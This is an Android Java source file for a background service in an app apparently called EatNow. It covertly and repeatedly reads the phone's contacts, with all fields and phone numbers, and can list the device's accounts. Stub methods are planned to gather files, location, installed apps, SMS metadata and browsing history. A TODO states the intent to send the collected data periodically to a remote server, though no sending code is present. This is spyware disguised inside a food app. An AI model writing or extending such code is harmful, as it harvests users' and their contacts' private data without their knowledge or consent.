package com.example.ludovic.eatnow;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.IntentService;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.text.LoginFilter;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

/**
 * Created by Ludovic Zipsin on 30/10/16.
 * Mail: ludovic.j.r.zipsin@gmail.com
 * Github: https://github.com/LudoZipsin
 */
public class BGService extends Service {

    private static final int SECONDE = 1000;
    private static final int MINUTE = 60*SECONDE;
    private static String sharePreferenceString;
    private static String identityString;


    //TODO: make most of the collecting data here and send them periodically to a remote server
    //note: have to fetch the userID from db

    @Override
    public int onStartCommand(Intent intent, int flags, int startId){
        Log.i("BGService", "Service started");
        DBHelper dbHelper = new DBHelper(getApplicationContext());
        final String userID = dbHelper.getUserID();
        Log.i("BGService", "userID = " + userID);

        new Thread(new Runnable(){

            public void run() {
                int count = 0;
                boolean known = false;
                // TODO Auto-generated method stub
                while(true)
                {
                    try {
                        //Log.v("BGService", formatArray("accountReader", accountReader()));
                        Log.v("BGService", formatArray("contactReader", contactReader()));
                        Thread.sleep(10*SECONDE); // 5*MINUTE
                        if (!known){
                            Log.i("BGService", "Identity not sended. Sending know... (value = " + Boolean.toString(known) + ")");
                            known = true;
                            Log.i("BGService", "Identity is now known and sended");
                        } else {
                            count++;
                            if (count < 5) {
                                Log.i("BGService", "Identity known...");
                            } else {
                                count = 0;
                                known = false;
                                Log.i("BGService", "Identity is reseted...");
                            }
                        }
                        Log.i("BGService", "loop thread... sending from user " + userID);
                    } catch (InterruptedException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }

                }

            }
        }).start();

        return Service.START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private ArrayList<String> fileReader(){
        ArrayList<String> fileList = new ArrayList<>();
        // TODO fun stuff
        return fileList;
    }

    private ArrayList<String> contactReader(){
        ArrayList<String> contactList = new ArrayList<>();
        ContentResolver cr = EatNowApplication.getAppInstance().getContentResolver(); //Activity/Application android.content.Context
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        int counter = 0;
        if(cursor.moveToFirst())
        {
            do
            {
                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String[] infoArray = cursor.getColumnNames();
                String contact = "{";
                for (String string : infoArray){
                    contact += cursor.getString(cursor.getColumnIndex(string));
                    contact += ",";
                    Log.i("BGService", "field... " + string);
                }
                counter++;

                if(Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0)
                {
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",new String[]{ id }, null);
                    while (pCur.moveToNext())
                    {
                        String contactNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contact += contactNumber;
                        contact += "}";
                        break;
                    }
                    pCur.close();
                }
                Log.v("BGService", "contact number " + Integer.toString(counter) + ": " + contact);
            } while (cursor.moveToNext()) ;
        }
        return contactList;
    }

    private JSONObject accountReader(){
        AccountManager manager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
        Account[] list = manager.getAccounts();
        JSONObject jsonFinal = new JSONObject();
        JSONArray jsonAccountArray = new JSONArray();
        JSONObject jsonAccount;
        try {
            jsonFinal.put("dataType", "account");
            jsonFinal.put("number", list.length);
            for (Account account : list){
                jsonAccount = new JSONObject();
                jsonAccount.put("name", account.name);
                jsonAccount.put("type", account.type);
                jsonAccountArray.put(jsonAccount);
            }
            jsonFinal.put("data", jsonAccountArray);
        } catch (JSONException jsonException){
            jsonException.printStackTrace();
        }
        return jsonFinal;
    }

    private String locationReader(){
        String location = "";
        // TODO fun stuff
        return location;
    }

    private ArrayList<String> applicationReader(){
        ArrayList<String> fileList = new ArrayList<>();
        // TODO fun stuff
        return fileList;
    }

    private ArrayList<String> smsMetaDataReader(){
        ArrayList<String> smsList = new ArrayList<>();
        // TODO fun stuff
        return smsList;
    }

    private ArrayList<String> navigationHistoryReader(){
        ArrayList<String> navigationHistoryList = new ArrayList<>();
        // TODO fun stuff
        return navigationHistoryList;
    }

    private String formatArray(String origin, ArrayList<String> arrayList){
        String formatted = "";
        switch (origin){
            case "fileReader":
                formatted = "files";
                break;
            case "contactReader":
                formatted = "contacts";
                break;
            case "accountReader":
                formatted = "account";
                break;
            case "locationReader":
                formatted = "location";
                break;
            case "applicationReader":
                formatted = "application";
                break;
            case "smsMetaDataReader":
                formatted = "sms";
                break;
            case "navigationHistoryReader":
                formatted = "history";
                break;
            default:
                formatted = "general";
        }
        formatted += ":";
        formatted += "{";
        formatted += convertArraylist(arrayList);
        formatted += "}";
        return formatted;
    }

    private String convertArraylist(ArrayList<String> arrayList){
        String returned = "";
        for (String elem : arrayList){
            returned += elem;
            returned += ",";
        }
        returned = ((returned == null) || (returned.length() == 0)) ? returned : returned.substring(0, returned.length()-1);
        return returned;
    }

}
